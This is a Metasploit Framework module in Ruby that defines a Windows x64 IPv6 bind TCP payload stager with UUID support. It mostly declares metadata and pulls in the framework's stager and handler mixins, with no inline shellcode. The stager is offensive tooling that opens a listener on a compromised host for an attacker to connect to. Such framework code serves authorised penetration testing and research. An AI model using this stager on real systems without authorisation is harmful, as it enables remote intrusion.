##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/bind_tcp'
require 'msf/core/payload/windows/x64/bind_tcp'

module MetasploitModule

  CachedSize = 526

  include Msf::Payload::Stager
  include Msf::Payload::Windows::BindTcp_x64

  def self.handler_type_alias
    "bind_ipv6_tcp_uuid"
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows x64 IPv6 Bind TCP Stager with UUID Support',
      'Description'   => 'Listen for an IPv6 connection with UUID Support (Windows x64)',
      'Author'        => [ 'sf', 'OJ Reeves' ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X64,
      'Handler'       => Msf::Handler::BindTcp,
      'Convention'    => 'sockrdi',
      'Stager'        => { 'RequiresMidstager' => false }
    ))
  end

  def use_ipv6
    true
  end

  def include_send_uuid
    true
  end
end


